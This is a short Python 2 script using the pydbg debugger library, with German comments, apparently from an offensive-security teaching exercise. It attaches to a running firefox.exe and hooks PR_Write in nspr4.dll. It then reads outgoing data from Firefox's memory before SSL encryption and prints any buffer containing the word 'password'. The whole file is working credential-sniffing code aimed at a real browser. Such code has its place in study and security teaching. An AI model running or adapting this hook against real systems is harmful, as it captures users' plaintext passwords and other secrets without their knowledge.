'''
Created on 18.09.2011

@author: luki
'''

from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg           = pydbg()
found_firefox = False

# Wir verwenden ein globales Muster, nach dem der Hook
# suchen kann
pattern = "password"

# Dies ist die Callback-Funktion für den Entry-Hook.
# Das uns interessierende Argument ist args[1]
def ssl_sniff(dbg, args):
  # Nun lesen wir den Speicher aus, der durch das zweite Argument bestimmt wird.
  # Dieser liegt als ASCII SString vor, d. h. wir lesen die Daten in einer Schleife ein,
  # bis wir auf ein NULL-Byte treffen
  buffer = ""
  offset = 0
  
  while 1:
    byte = dbg.read_process_memory(args[1] + offset, 1)
    
    if byte != "\x00":
      buffer += byte
      offset += 1
      continue
    else:
      break
    
  if pattern in buffer:
    print "Pre-Encrypted: %s" % buffer
  
  return DBG_CONTINUE


# Schnelle Prozessnummerierung zum aufspühren von firefox.exe
for (pid, name) in dbg.enumerate_processes():

  if name.lower() == "firefox.exe":
    
    found_firefox = True
    hooks         = utils.hook_container()
    
    dbg.attach(pid)
    print "[*] Attaching to firefox.exe with PID: %d" % pid
    
    # Funktionsadresse auflösen
    hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")
    
    if hook_address:
      # Hook in den Container aufnehmen. Wir benötigen kein
      # Exit-Callback und setzen es daher auf None.
      hooks.add(dbg, hook_address, 2, ssl_sniff, None)
      print "[*] nspr.PR_Write hooked at: 0x%08x" % hook_address
      break
    
    else:
      print "[*] Error: Couldn't resolve hook address."
      sys.exit(-1)
      

if found_firefox:
  print "[*] Hook set, continuing process."
  dbg.run()
else:
  print "[*] Error: Couldn'f find the firefox.exe process."
  sys.exit(-1)
  
    
  
  